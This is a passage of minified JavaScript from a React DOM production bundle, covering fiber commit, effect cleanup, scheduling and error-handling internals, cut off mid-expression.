6:if(n&&e.stateNode!=null)bA(n,e,n.memoizedProps,r);else{if(typeof r!="string"&&e.stateNode===null)throw Error(le(166));if(t=qo(Mu.current),qo(xi.current),Zh(e)){if(r=e.stateNode,t=e.memoizedProps,r[Ti]=e,(s=r.nodeValue!==t)&&(n=Mr,n!==null))switch(n.tag){case 3:Yh(r.nodeValue,t,(n.mode&1)!==0);break;case 5:n.memoizedProps.suppressHydrationWarning!==!0&&Yh(r.nodeValue,t,(n.mode&1)!==0)}s&&(e.flags|=4)}else r=(t.nodeType===9?t:t.ownerDocument).createTextNode(r),r[Ti]=e,e.stateNode=r}return Hn(e),null;case 13:if(Nt(Wt),r=e.memoizedState,n===null||n.memoizedState!==null&&n.memoizedState.dehydrated!==null){if(jt&&Cr!==null&&e.mode&1&&!(e.flags&128))$T(),Rl(),e.flags|=98560,s=!1;else if(s=Zh(e),r!==null&&r.dehydrated!==null){if(n===null){if(!s)throw Error(le(318));if(s=e.memoizedState,s=s!==null?s.dehydrated:null,!s)throw Error(le(317));s[Ti]=e}else Rl(),!(e.flags&128)&&(e.memoizedState=null),e.flags|=4;Hn(e),s=!1}else si!==null&&(M0(si),si=null),s=!0;if(!s)return e.flags&65536?e:null}return e.flags&128?(e.lanes=t,e):(r=r!==null,r!==(n!==null&&n.memoizedState!==null)&&r&&(e.child.flags|=8192,e.mode&1&&(n===null||Wt.current&1?mn===0&&(mn=3):Mw())),e.updateQueue!==null&&(e.flags|=4),Hn(e),null);case 4:return Nl(),S0(n,e),n===null&&xu(e.stateNode.containerInfo),Hn(e),null;case 10:return pw(e.type._context),Hn(e),null;case 17:return _r(e.type)&&id(),Hn(e),null;case 19:if(Nt(Wt),s=e.memoizedState,s===null)return Hn(e),null;if(r=(e.flags&128)!==0,o=s.rendering,o===null)if(r)Uc(s,!1);else{if(mn!==0||n!==null&&n.flags&128)for(n=e.child;n!==null;){if(o=hd(n),o!==null){for(e.flags|=128,Uc(s,!1),r=o.updateQueue,r!==null&&(e.updateQueue=r,e.flags|=4),e.subtreeFlags=0,r=t,t=e.child;t!==null;)s=t,n=r,s.flags&=14680066,o=s.alternate,o===null?(s.childLanes=0,s.lanes=n,s.child=null,s.subtreeFlags=0,s.memoizedProps=null,s.memoizedState=null,s.updateQueue=null,s.dependencies=null,s.stateNode=null):(s.childLanes=o.childLanes,s.lanes=o.lanes,s.child=o.child,s.subtreeFlags=0,s.deletions=null,s.memoizedProps=o.memoizedProps,s.memoizedState=o.memoizedState,s.updateQueue=o.updateQueue,s.type=o.type,n=o.dependencies,s.dependencies=n===null?null:{lanes:n.lanes,firstContext:n.firstContext}),t=t.sibling;return Tt(Wt,Wt.current&1|2),e.child}n=n.sibling}s.tail!==null&&rn()>Ll&&(e.flags|=128,r=!0,Uc(s,!1),e.lanes=4194304)}else{if(!r)if(n=hd(o),n!==null){if(e.flags|=128,r=!0,t=n.updateQueue,t!==null&&(e.updateQueue=t,e.flags|=4),Uc(s,!0),s.tail===null&&s.tailMode==="hidden"&&!o.alternate&&!jt)return Hn(e),null}else 2*rn()-s.renderingStartTime>Ll&&t!==1073741824&&(e.flags|=128,r=!0,Uc(s,!1),e.lanes=4194304);s.isBackwards?(o.sibling=e.child,e.child=o):(t=s.last,t!==null?t.sibling=o:e.child=o,s.last=o)}return s.tail!==null?(e=s.tail,s.rendering=e,s.tail=e.sibling,s.renderingStartTime=rn(),e.sibling=null,t=Wt.current,Tt(Wt,r?t&1|2:t&1),e):(Hn(e),null);case 22:case 23:return Rw(),r=e.memoizedState!==null,n!==null&&n.memoizedState!==null!==r&&(e.flags|=8192),r&&e.mode&1?Sr&1073741824&&(Hn(e),e.subtreeFlags&6&&(e.flags|=8192)):Hn(e),null;case 24:return null;case 25:return null}throw Error(le(156,e.tag))}function pN(n,e){switch(uw(e),e.tag){case 1:return _r(e.type)&&id(),n=e.flags,n&65536?(e.flags=n&-65537|128,e):null;case 3:return Nl(),Nt(vr),Nt(nr),vw(),n=e.flags,n&65536&&!(n&128)?(e.flags=n&-65537|128,e):null;case 5:return ww(e),null;case 13:if(Nt(Wt),n=e.memoizedState,n!==null&&n.dehydrated!==null){if(e.alternate===null)throw Error(le(340));Rl()}return n=e.flags,n&65536?(e.flags=n&-65537|128,e):null;case 19:return Nt(Wt),null;case 4:return Nl(),null;case 10:return pw(e.type._context),null;case 22:case 23:return Rw(),null;case 24:return null;default:return null}}var ef=!1,Xn=!1,gN=typeof WeakSet=="function"?WeakSet:Set,ye=null;function al(n,e){var t=n.ref;if(t!==null)if(typeof t=="function")try{t(null)}catch(r){en(n,e,r)}else t.current=null}function T0(n,e,t){try{t()}catch(r){en(n,e,r)}}var W_=!1;function mN(n,e){if(a0=ed,n=MT(),lw(n)){if("selectionStart"in n)var t={start:n.selectionStart,end:n.selectionEnd};else e:{t=(t=n.ownerDocument)&&t.defaultView||window;var r=t.getSelection&&t.getSelection();if(r&&r.rangeCount!==0){t=r.anchorNode;var i=r.anchorOffset,s=r.focusNode;r=r.focusOffset;try{t.nodeType,s.nodeType}catch{t=null;break e}var o=0,a=-1,l=-1,u=0,h=0,f=n,p=null;t:for(;;){for(var w;f!==t||i!==0&&f.nodeType!==3||(a=o+i),f!==s||r!==0&&f.nodeType!==3||(l=o+r),f.nodeType===3&&(o+=f.nodeValue.length),(w=f.firstChild)!==null;)p=f,f=w;for(;;){if(f===n)break t;if(p===t&&++u===i&&(a=o),p===s&&++h===r&&(l=o),(w=f.nextSibling)!==null)break;f=p,p=f.parentNode}f=w}t=a===-1||l===-1?null:{start:a,end:l}}else t=null}t=t||{start:0,end:0}}else t=null;for(l0={focusedElem:n,selectionRange:t},ed=!1,ye=e;ye!==null;)if(e=ye,n=e.child,(e.subtreeFlags&1028)!==0&&n!==null)n.return=e,ye=n;else for(;ye!==null;){e=ye;try{var x=e.alternate;if(e.flags&1024)switch(e.tag){case 0:case 11:case 15:break;case 1:if(x!==null){var k=x.memoizedProps,I=x.memoizedState,A=e.stateNode,b=A.getSnapshotBeforeUpdate(e.elementType===e.type?k:ni(e.type,k),I);A.__reactInternalSnapshotBeforeUpdate=b}break;case 3:var E=e.stateNode.containerInfo;E.nodeType===1?E.textContent="":E.nodeType===9&&E.documentElement&&E.removeChild(E.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(le(163))}}catch(O){en(e,e.return,O)}if(n=e.sibling,n!==null){n.return=e.return,ye=n;break}ye=e.return}return x=W_,W_=!1,x}function au(n,e,t){var r=e.updateQueue;if(r=r!==null?r.lastEffect:null,r!==null){var i=r=r.next;do{if((i.tag&n)===n){var s=i.destroy;i.destroy=void 0,s!==void 0&&T0(e,t,s)}i=i.next}while(i!==r)}}function hp(n,e){if(e=e.updateQueue,e=e!==null?e.lastEffect:null,e!==null){var t=e=e.next;do{if((t.tag&n)===n){var r=t.create;t.destroy=r()}t=t.next}while(t!==e)}}function A0(n){var e=n.ref;if(e!==null){var t=n.stateNode;switch(n.tag){case 5:n=t;break;default:n=t}typeof e=="function"?e(n):e.current=n}}function xA(n){var e=n.alternate;e!==null&&(n.alternate=null,xA(e)),n.child=null,n.deletions=null,n.sibling=null,n.tag===5&&(e=n.stateNode,e!==null&&(delete e[Ti],delete e[Cu],delete e[h0],delete e[JM],delete e[XM])),n.stateNode=null,n.return=null,n.dependencies=null,n.memoizedProps=null,n.memoizedState=null,n.pendingProps=null,n.stateNode=null,n.updateQueue=null}function kA(n){return n.tag===5||n.tag===3||n.tag===4}function $_(n){e:for(;;){for(;n.sibling===null;){if(n.return===null||kA(n.return))return null;n=n.return}for(n.sibling.return=n.return,n=n.sibling;n.tag!==5&&n.tag!==6&&n.tag!==18;){if(n.flags&2||n.child===null||n.tag===4)continue e;n.child.return=n,n=n.child}if(!(n.flags&2))return n.stateNode}}function b0(n,e,t){var r=n.tag;if(r===5||r===6)n=n.stateNode,e?t.nodeType===8?t.parentNode.insertBefore(n,e):t.insertBefore(n,e):(t.nodeType===8?(e=t.parentNode,e.insertBefore(n,t)):(e=t,e.appendChild(n)),t=t._reactRootContainer,t!=null||e.onclick!==null||(e.onclick=rd));else if(r!==4&&(n=n.child,n!==null))for(b0(n,e,t),n=n.sibling;n!==null;)b0(n,e,t),n=n.sibling}function x0(n,e,t){var r=n.tag;if(r===5||r===6)n=n.stateNode,e?t.insertBefore(n,e):t.appendChild(n);else if(r!==4&&(n=n.child,n!==null))for(x0(n,e,t),n=n.sibling;n!==null;)x0(n,e,t),n=n.sibling}var Nn=null,ii=!1;function bs(n,e,t){for(t=t.child;t!==null;)CA(n,e,t),t=t.sibling}function CA(n,e,t){if(bi&&typeof bi.onCommitFiberUnmount=="function")try{bi.onCommitFiberUnmount(rp,t)}catch{}switch(t.tag){case 5:Xn||al(t,e);case 6:var r=Nn,i=ii;Nn=null,bs(n,e,t),Nn=r,ii=i,Nn!==null&&(ii?(n=Nn,t=t.stateNode,n.nodeType===8?n.parentNode.removeChild(t):n.removeChild(t)):Nn.removeChild(t.stateNode));break;case 18:Nn!==null&&(ii?(n=Nn,t=t.stateNode,n.nodeType===8?Dg(n.parentNode,t):n.nodeType===1&&Dg(n,t),Tu(n)):Dg(Nn,t.stateNode));break;case 4:r=Nn,i=ii,Nn=t.stateNode.containerInfo,ii=!0,bs(n,e,t),Nn=r,ii=i;break;case 0:case 11:case 14:case 15:if(!Xn&&(r=t.updateQueue,r!==null&&(r=r.lastEffect,r!==null))){i=r=r.next;do{var s=i,o=s.destroy;s=s.tag,o!==void 0&&(s&2||s&4)&&T0(t,e,o),i=i.next}while(i!==r)}bs(n,e,t);break;case 1:if(!Xn&&(al(t,e),r=t.stateNode,typeof r.componentWillUnmount=="function"))try{r.props=t.memoizedProps,r.state=t.memoizedState,r.componentWillUnmount()}catch(a){en(t,e,a)}bs(n,e,t);break;case 21:bs(n,e,t);break;case 22:t.mode&1?(Xn=(r=Xn)||t.memoizedState!==null,bs(n,e,t),Xn=r):bs(n,e,t);break;default:bs(n,e,t)}}function H_(n){var e=n.updateQueue;if(e!==null){n.updateQueue=null;var t=n.stateNode;t===null&&(t=n.stateNode=new gN),e.forEach(function(r){var i=AN.bind(null,n,r);t.has(r)||(t.add(r),r.then(i,i))})}}function Xr(n,e){var t=e.deletions;if(t!==null)for(var r=0;r<t.length;r++){var i=t[r];try{var s=n,o=e,a=o;e:for(;a!==null;){switch(a.tag){case 5:Nn=a.stateNode,ii=!1;break e;case 3:Nn=a.stateNode.containerInfo,ii=!0;break e;case 4:Nn=a.stateNode.containerInfo,ii=!0;break e}a=a.return}if(Nn===null)throw Error(le(160));CA(s,o,i),Nn=null,ii=!1;var l=i.alternate;l!==null&&(l.return=null),i.return=null}catch(u){en(i,e,u)}}if(e.subtreeFlags&12854)for(e=e.child;e!==null;)RA(e,n),e=e.sibling}function RA(n,e){var t=n.alternate,r=n.flags;switch(n.tag){case 0:case 11:case 14:case 15:if(Xr(e,n),wi(n),r&4){try{au(3,n,n.return),hp(3,n)}catch(k){en(n,n.return,k)}try{au(5,n,n.return)}catch(k){en(n,n.return,k)}}break;case 1:Xr(e,n),wi(n),r&512&&t!==null&&al(t,t.return);break;case 5:if(Xr(e,n),wi(n),r&512&&t!==null&&al(t,t.return),n.flags&32){var i=n.stateNode;try{_u(i,"")}catch(k){en(n,n.return,k)}}if(r&4&&(i=n.stateNode,i!=null)){var s=n.memoizedProps,o=t!==null?t.memoizedProps:s,a=n.type,l=n.updateQueue;if(n.updateQueue=null,l!==null)try{a==="input"&&s.type==="radio"&&s.name!=null&&JS(i,s),Zm(a,o);var u=Zm(a,s);for(o=0;o<l.length;o+=2){var h=l[o],f=l[o+1];h==="style"?rT(i,f):h==="dangerouslySetInnerHTML"?tT(i,f):h==="children"?_u(i,f):Qy(i,h,f,u)}switch(a){case"input":qm(i,s);break;case"textarea":XS(i,s);break;case"select":var p=i._wrapperState.wasMultiple;i._wrapperState.wasMultiple=!!s.multiple;var w=s.value;w!=null?pl(i,!!s.multiple,w,!1):p!==!!s.multiple&&(s.defaultValue!=null?pl(i,!!s.multiple,s.defaultValue,!0):pl(i,!!s.multiple,s.multiple?[]:"",!1))}i[Cu]=s}catch(k){en(n,n.return,k)}}break;case 6:if(Xr(e,n),wi(n),r&4){if(n.stateNode===null)throw Error(le(162));i=n.stateNode,s=n.memoizedProps;try{i.nodeValue=s}catch(k){en(n,n.return,k)}}break;case 3:if(Xr(e,n),wi(n),r&4&&t!==null&&t.memoizedState.isDehydrated)try{Tu(e.containerInfo)}catch(k){en(n,n.return,k)}break;case 4:Xr(e,n),wi(n);break;case 13:Xr(e,n),wi(n),i=n.child,i.flags&8192&&(s=i.memoizedState!==null,i.stateNode.isHidden=s,!s||i.alternate!==null&&i.alternate.memoizedState!==null||(kw=rn())),r&4&&H_(n);break;case 22:if(h=t!==null&&t.memoizedState!==null,n.mode&1?(Xn=(u=Xn)||h,Xr(e,n),Xn=u):Xr(e,n),wi(n),r&8192){if(u=n.memoizedState!==null,(n.stateNode.isHidden=u)&&!h&&n.mode&1)for(ye=n,h=n.child;h!==null;){for(f=ye=h;ye!==null;){switch(p=ye,w=p.child,p.tag){case 0:case 11:case 14:case 15:au(4,p,p.return);break;case 1:al(p,p.return);var x=p.stateNode;if(typeof x.componentWillUnmount=="function"){r=p,t=p.return;try{e=r,x.props=e.memoizedProps,x.state=e.memoizedState,x.componentWillUnmount()}catch(k){en(r,t,k)}}break;case 5:al(p,p.return);break;case 22:if(p.memoizedState!==null){K_(f);continue}}w!==null?(w.return=p,ye=w):K_(f)}h=h.sibling}e:for(h=null,f=n;;){if(f.tag===5){if(h===null){h=f;try{i=f.stateNode,u?(s=i.style,typeof s.setProperty=="function"?s.setProperty("display","none","important"):s.display="none"):(a=f.stateNode,l=f.memoizedProps.style,o=l!=null&&l.hasOwnProperty("display")?l.display:null,a.style.display=nT("display",o))}catch(k){en(n,n.return,k)}}}else if(f.tag===6){if(h===null)try{f.stateNode.nodeValue=u?"":f.memoizedProps}catch(k){en(n,n.return,k)}}else if((f.tag!==22&&f.tag!==23||f.memoizedState===null||f===n)&&f.child!==null){f.child.return=f,f=f.child;continue}if(f===n)break e;for(;f.sibling===null;){if(f.return===null||f.return===n)break e;h===f&&(h=null),f=f.return}h===f&&(h=null),f.sibling.return=f.return,f=f.sibling}}break;case 19:Xr(e,n),wi(n),r&4&&H_(n);break;case 21:break;default:Xr(e,n),wi(n)}}function wi(n){var e=n.flags;if(e&2){try{e:{for(var t=n.return;t!==null;){if(kA(t)){var r=t;break e}t=t.return}throw Error(le(160))}switch(r.tag){case 5:var i=r.stateNode;r.flags&32&&(_u(i,""),r.flags&=-33);var s=$_(n);x0(n,s,i);break;case 3:case 4:var o=r.stateNode.containerInfo,a=$_(n);b0(n,a,o);break;default:throw Error(le(161))}}catch(l){en(n,n.return,l)}n.flags&=-3}e&4096&&(n.flags&=-4097)}function yN(n,e,t){ye=n,MA(n)}function MA(n,e,t){for(var r=(n.mode&1)!==0;ye!==null;){var i=ye,s=i.child;if(i.tag===22&&r){var o=i.memoizedState!==null||ef;if(!o){var a=i.alternate,l=a!==null&&a.memoizedState!==null||Xn;a=ef;var u=Xn;if(ef=o,(Xn=l)&&!u)for(ye=i;ye!==null;)o=ye,l=o.child,o.tag===22&&o.memoizedState!==null?G_(i):l!==null?(l.return=o,ye=l):G_(i);for(;s!==null;)ye=s,MA(s),s=s.sibling;ye=i,ef=a,Xn=u}q_(n)}else i.subtreeFlags&8772&&s!==null?(s.return=i,ye=s):q_(n)}}function q_(n){for(;ye!==null;){var e=ye;if(e.flags&8772){var t=e.alternate;try{if(e.flags&8772)switch(e.tag){case 0:case 11:case 15:Xn||hp(5,e);break;case 1:var r=e.stateNode;if(e.flags&4&&!Xn)if(t===null)r.componentDidMount();else{var i=e.elementType===e.type?t.memoizedProps:ni(e.type,t.memoizedProps);r.componentDidUpdate(i,t.memoizedState,r.__reactInternalSnapshotBeforeUpdate)}var s=e.updateQueue;s!==null&&R_(e,s,r);break;case 3:var o=e.updateQueue;if(o!==null){if(t=null,e.child!==null)switch(e.child.tag){case 5:t=e.child.stateNode;break;case 1:t=e.child.stateNode}R_(e,o,t)}break;case 5:var a=e.stateNode;if(t===null&&e.flags&4){t=a;var l=e.memoizedProps;switch(e.type){case"button":case"input":case"select":case"textarea":l.autoFocus&&t.focus();break;case"img":l.src&&(t.src=l.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(e.memoizedState===null){var u=e.alternate;if(u!==null){var h=u.memoizedState;if(h!==null){var f=h.dehydrated;f!==null&&Tu(f)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(le(163))}Xn||e.flags&512&&A0(e)}catch(p){en(e,e.return,p)}}if(e===n){ye=null;break}if(t=e.sibling,t!==null){t.return=e.return,ye=t;break}ye=e.return}}function K_(n){for(;ye!==null;){var e=ye;if(e===n){ye=null;break}var t=e.sibling;if(t!==null){t.return=e.return,ye=t;break}ye=e.return}}function G_(n){for(;ye!==null;){var e=ye;try{switch(e.tag){case 0:case 11:case 15:var t=e.return;try{hp(4,e)}catch(l){en(e,t,l)}break;case 1:var r=e.stateNode;if(typeof r.componentDidMount=="function"){var i=e.return;try{r.componentDidMount()}catch(l){en(e,i,l)}}var s=e.return;try{A0(e)}catch(l){en(e,s,l)}break;case 5:var o=e.return;try{A0(e)}catch(l){en(e,o,l)}}}catch(l){en(e,e.return,l)}if(e===n){ye=null;break}var a=e.sibling;if(a!==null){a.return=e.return,ye=a;break}ye=e.return}}var wN=Math.ceil,pd=vs.ReactCurrentDispatcher,bw=vs.ReactCurrentOwner,Kr=vs.ReactCurrentBatchConfig,Je=0,bn=null,fn=null,jn=0,Sr=0,ll=So(0),mn=0,Du=null,la=0,fp=0,xw=0,lu=null,pr=null,kw=0,Ll=1/0,Hi=null,gd=!1,k0=null,eo=null,tf=!1,zs=null,md=0,cu=0,C0=null,Cf=-1,Rf=0;function or(){return Je&6?rn():Cf!==-1?Cf:Cf=rn()}function to(n){return n.mode&1?Je&2&&jn!==0?jn&-jn:tN.transition!==null?(Rf===0&&(Rf=gT()),Rf):(n=ft,n!==0||(n=window.event,n=n===void 0?16:IT(n.type)),n):1}function ui(n,e,t,r){if(50<cu)throw cu=0,C0=null,Error(le(185));sh(n,t,r),(!(Je&2)||n!==bn)&&(n===bn&&(!(Je&2)&&(fp|=t),mn===4&&Os(n,jn)),Er(n,r),t===1&&Je===0&&!(e.mode&1)&&(Ll=rn()+500,lp&&To()))}function Er(n,e){var t=n.callbackNode;tM(n,e);var r=Xf(n,n===bn?jn:0);if(r===0)t!==null&&r_(t),n.callbackNode=null,n.callbackPriority=0;else if(e=r&-r,n.callbackPriority!==e){if(t!=null&&r_(t),e===1)n.tag===0?eN(Q_.bind(null,n)):FT(Q_.bind(null,n)),YM(function(){!(Je&6)&&To()}),t=null;else{switch(mT(r)){case 1:t=ew;break;case 4:t=dT;break;case 16:t=Jf;break;case 536870912:t=pT;break;default:t=Jf}t=jA(t,NA.bind(null,n))}n.callbackPriority=e,n.callbackNode=t}}function NA(n,e){if(Cf=-1,Rf=0,Je&6)throw Error(le(327));var t=n.callbackNode;if(vl()&&n.callbackNode!==t)return null;var r=Xf(n,n===bn?jn:0);if(r===0)return null;if(r&30||r&n.expiredLanes||e)e=yd(n,r);else{e=r;var i=Je;Je|=2;var s=LA();(bn!==n||jn!==e)&&(Hi=null,Ll=rn()+500,ea(n,e));do try{EN();break}catch(a){PA(n,a)}while(1);dw(),pd.current=s,Je=i,fn!==null?e=0:(bn=null,jn=0,e=mn)}if(e!==0){if(e===2&&(i=n0(n),i!==0&&(r=i,e=R0(n,i))),e===1)throw t=Du,ea(n,0),Os(n,r),Er(n,rn()),t;if(e===6)Os(n,r);else{if(i=n.current.alternate,!(r&30)&&!vN(i)&&(e=yd(n,r),e===2&&(s=n0(n),s!==0&&(r=s,e=R0(n,s))),e===1))throw t=Du,ea(n,0),Os(n,r),Er(n,rn()),t;switch(n.finishedWork=i,n.finishedLanes=r,e){case 0:case 1:throw Error(le(345));case 2:Bo(n,pr,Hi);break;case 3:if(Os(n,r),(r&130023424)===r&&(e=kw+500-rn(),10<e)){if(Xf(n,0)!==0)break;if(i=n.suspendedLanes,(i&r)!==r){or(),n.pingedLanes|=n.suspendedLanes&i;break}n.timeoutHandle=u0(Bo.bind(null,n,pr,Hi),e);break}Bo(n,pr,Hi);break;case 4:if(Os(n,r),(r&4194240)===r)break;for(e=n.eventTimes,i=-1;0<r;){var o=31-ci(r);s=1<<o,o=e[o],o>i&&(i=o),r&=~s}if(r=i,r=rn()-r,r=(120>r?120:480>r?480:1080>r?1080:1920>r?1920:3e3>r?3e3:4320>r?4320:1960*wN(r/1960))-r,10<r){n.timeoutHandle=u0(Bo.bind(null,n,pr,Hi),r);break}Bo(n,pr,Hi);break;case 5:Bo(n,pr,Hi);break;default:throw Error(le(329))}}}return Er(n,rn()),n.callbackNode===t?NA.bind(null,n):null}function R0(n,e){var t=lu;return n.current.memoizedState.isDehydrated&&(ea(n,e).flags|=256),n=yd(n,e),n!==2&&(e=pr,pr=t,e!==null&&M0(e)),n}function M0(n){pr===null?pr=n:pr.push.apply(pr,n)}function vN(n){for(var e=n;;){if(e.flags&16384){var t=e.updateQueue;if(t!==null&&(t=t.stores,t!==null))for(var r=0;r<t.length;r++){var i=t[r],s=i.getSnapshot;i=i.value;try{if(!pi(s(),i))return!1}catch{return!1}}}if(t=e.child,e.subtreeFlags&16384&&t!==null)t.return=e,e=t;else{if(e===n)break;for(;e.sibling===null;){if(e.return===null||e.return===n)return!0;e=e.return}e.sibling.return=e.return,e=e.sibling}}return!0}function Os(n,e){for(e&=~xw,e&=~fp,n.suspendedLanes|=e,n.pingedLanes&=~e,n=n.expirationTimes;0<e;){var t=31-ci(e),r=1<<t;n[t]=-1,e&=~r}}function Q_(n){if(Je&6)throw Error(le(327));vl();var e=Xf(n,0);if(!(e&1))return Er(n,rn()),null;var t=yd(n,e);if(n.tag!==0&&t===2){var r=n0(n);r!==0&&(e=r,t=R0(n,r))}if(t===1)throw t=Du,ea(n,0),Os(n,e),Er(n,rn()),t;if(t===6)throw Error(le(345));return n.finishedWork=n.current.alternate,n.finishedLanes=e,Bo(n,pr,Hi),Er(n,rn()),null}function Cw(n,e){var t=Je;Je|=1;try{return n(e)}finally{Je=t,Je===0&&(Ll=rn()+500,lp&&To())}}function ca(n){zs!==null&&zs.tag===0&&!(Je&6)&&vl();var e=Je;Je|=1;var t=Kr.transition,r=ft;try{if(Kr.transition=null,ft=1,n)return n()}finally{ft=r,Kr.transition=t,Je=e,!(Je&6)&&To()}}function Rw(){Sr=ll.current,Nt(ll)}function ea(n,e){n.finishedWork=null,n.finishedLanes=0;var t=n.timeoutHandle;if(t!==-1&&(n.timeoutHandle=-1,QM(t)),fn!==null)for(t=fn.return;t!==null;){var r=t;switch(uw(r),r.tag){case 1:r=r.type.childContextTypes,r!=null&&id();break;case 3:Nl(),Nt(vr),Nt(nr),vw();break;case 5:ww(r);break;case 4:Nl();break;case 13:Nt(Wt);break;case 19:Nt(Wt);break;case 10:pw(r.type._context);break;case 22:case 23:Rw()}t=t.return}if(bn=n,fn=n=no(n.current,null),jn=Sr=e,mn=0,Du=null,xw=fp=la=0,pr=lu=null,Ho!==null){for(e=0;e<Ho.length;e++)if(t=Ho[e],r=t.interleaved,r!==null){t.interleaved=null;var i=r.next,s=t.pending;if(s!==null){var o=s.next;s.next=i,r.next=o}t.pending=r}Ho=null}return n}function PA(n,e){do{var t=fn;try{if(dw(),bf.current=dd,fd){for(var r=qt.memoizedState;r!==null;){var i=r.queue;i!==null&&(i.pending=null),r=r.next}fd=!1}if(aa=0,Tn=gn=qt=null,ou=!1,Nu=0,bw.current=null,t===null||t.return===null){mn=1,Du=e,fn=null;break}e:{var s=n,o=t.return,a=t,l=e;if(e=jn,a.flags|=32768,l!==null&&typeof l=="object"&&typeof l.then=="function"){var u=l,h=a,f=h.tag;if(!(h.mode&1)&&(f===0||f===11||f===15)){var p=h.alternate;p?(h.updateQueue=p.updateQueue,h.memoizedState=p.memoizedState,h.lanes=p.lanes):(h.updateQueue=null,h.memoizedState=null)}var w=O_(o);if(w!==null){w.flags&=-257,B_(w,o,a,s,e),w.mode&1&&D_(s,u,e),e=w,l=u;var x=e.updateQueue;if(x===null){var k=new Set;k.add(l),e.updateQueue=k}else x.add(l);break e}else{if(!(e&1)){D_(s,u,e),Mw();break e}l=Error(le(426))}}else if(jt&&a.mode&1){var I=O_(o);if(I!==null){!(I.flags&65536)&&(I.flags|=256),B_(I,o,a,s,e),hw(Pl(l,a));break e}}s=l=Pl(l,a),mn!==4&&(mn=2),lu===null?lu=[s]:lu.push(s),s=o;do{switch(s.tag){case 3:s.flags|=65536,e&=-e,s.lanes|=e;var A=mA(s,l,e);C_(s,A);break e;case 1:a=l;var b=s.type,E=s.stateNode;if(!(s.flags&128)&&(typeof b.getDerivedStateFromError=="function"||E!==null&&typeof E.componentDidCatch=="function"&&(eo===null||!eo.has(E)))){s.flags|=65536,e&=-e,s.lanes|=e;var O=yA(s,a,e);C_(s,O);break e}}s=s.return}while(s!==null)}OA(t)}catch(W){e=W,fn===t&&t!==null&&(fn=t=t.return);continue}break}while(1)}function LA(){var n=pd.current;return pd.current=dd,n===null?dd:n}function Mw(){(mn===0||mn===3||mn===2)&&(mn=4),bn===null||!(la&268435455)&&!(fp&268435455)||Os(bn,jn)}function yd(n,e){var t=Je;Je|=2;var r=LA();(bn!==n||jn!==e)&&(Hi=null,ea(n,e));do try{_N();break}catch(i){PA(n,i)}while(1);if(dw(),Je=t,pd.current=r,fn!==null)throw Error(le(261));return bn=null,jn=0,mn}function _N(){for(;fn!==null;)DA(fn)}function EN(){for(;fn!==null&&!qR();)DA(fn)}function DA(n){var e=UA(n.alternate,n,Sr);n.memoizedProps=n.pendingProps,e===null?OA(n):fn=e,bw.current=null}function OA(n){var e=n;do{var t=e.alternate;if(n=e.return,e.flags&32768){if(t=pN(t,e),t!==null){t.flags&=32767,fn=t;return}if(n!==null)n.flags|=32768,n.subtreeFlags=0,n.deletions=null;else{mn=6,fn=null;return}}else if(t=dN(t,e,Sr),t!==null){fn=t;return}if(e=e.sibling,e!==null){fn=e;return}fn=e=n}while(e!==null);mn===0&&(mn=5)}function Bo(n,e,t){var r=ft,i=Kr.transition;try{Kr.transition=null,ft=1,IN(n,e,t,r)}finally{Kr.transition=i,ft=r}return null}function IN(n,e,t,r){do vl();while(zs!==null);if(Je&6)throw Error(le(327));t=n.finishedWork;var i=n.finishedLanes;if(t===null)return null;if(n.finishedWork=null,n.finishedLanes=0,t===n.current)throw Error(le(177));n.callbackNode=null,n.callbackPriority=0;var s=t.lanes|t.childLanes;if(nM(n,s),n===bn&&(fn=bn=null,jn=0),!(t.subtreeFlags&2064)&&!(t.flags&2064)||tf||(tf=!0,jA(Jf,function(){return vl(),null})),s=(t.flags&15990)!==0,t.subtreeFlags&15990||s){s=Kr.transition,Kr.transition=null;var o=ft;ft=1;var a=Je;Je|=4,bw.current=null,mN(n,t),RA(t,n),zM(l0),ed=!!a0,l0=a0=null,n.current=t,yN(t),KR(),Je=a,ft=o,Kr.transition=s}else n.current=t;if(tf&&(tf=!1,zs=n,md=i),s=n.pendingLanes,s===0&&(eo=null),YR(t.stateNode),Er(n,rn()),e!==null)for(r=n.onRecoverableError,t=0;t<e.length;t++)i=e[t],r(i.value,{componentStack:i.stack,digest:i.digest});if(gd)throw gd=!1,n=k0,k0=null,n;return md&1&&n.tag!==0&&vl(),s=n.pendingLanes,s&1?n===C0?cu++:(cu=0,C0=n):cu=0,To(),null}function vl(){if(zs!==null){var n=mT(md),e=Kr.transition,t=ft;try{if(Kr.transition=null,ft=16>n?16:n,zs===null)var r=!1;else{if(n=zs,zs=null,md=0,Je&6)throw Error(le(331));var i=Je;for(Je|=4,ye=n.current;ye!==null;){var s=ye,o=s.child;if(ye.flags&16){var a=s.deletions;if(a!==null){for(var l=0;l<a.length;l++){var u=a[l];for(ye=u;ye!==null;){var h=ye;switch(h.tag){case 0:case 11:case 15:au(8,h,s)}var f=h.child;if(f!==null)f.return=h,ye=f;else for(;ye!==null;){h=ye;var p=h.sibling,w=h.return;if(xA(h),h===u){ye=null;break}if(p!==null){p.return=w,ye=p;break}ye=w}}}var x=s.alternate;if(x!==null){var k=x.child;if(k!==null){x.child=null;do{var I=k.sibling;k.sibling=null,k=I}while(k!==null)}}ye=s}}if(s.subtreeFlags&2064&&o!==null)o.return=s,ye=o;else e:for(;ye!==null;){if(s=ye,s.flags&2048)switch(s.tag){case 0:case 11:case 15:au(9,s,s.return)}var A=s.sibling;if(A!==null){A.return=s.return,ye=A;break e}ye=s.return}}var b=n.current;for(ye=b;ye!==null;){o=ye;var E=o.child;if(o.subtreeFlags&2064&&E!==null)E.return=o,ye=E;else e:for(o=b;ye!==null;){if(a=ye,a.flags&2048)try{switch(a.tag){case 0:case 11:case 15:hp(9,a)}}catch(W){en(a,a.return,W)}if(a===o){ye=null;break e}var O=a.sibling;if(O!==null){O.return=a.return,ye=O;break e}ye=a.return}}if(Je=i,To(),bi&&typeof bi.onPostCommitFiberRoot=="function")try{bi.onPostCommitFiberRoot(rp,n)}catch{}r=!0}return r}finally{ft=t,Kr.transition=e}}return!1}function Y_(n,e,t){e=Pl(t,e),e=mA(n,e,1),n=Xs(n,e,1),e=or(),n!==null&&(sh(n,1,e),Er(n,e))}function en(n,e,t){if(n.tag===3)Y_(n,n,t);else for(;e!==null;){if(e.tag===3){Y_(e,n,t);break}else if(e.tag===1){var r=e.stateNode;if(typeof e.type.getDerivedStateFromError=="function"||typeof 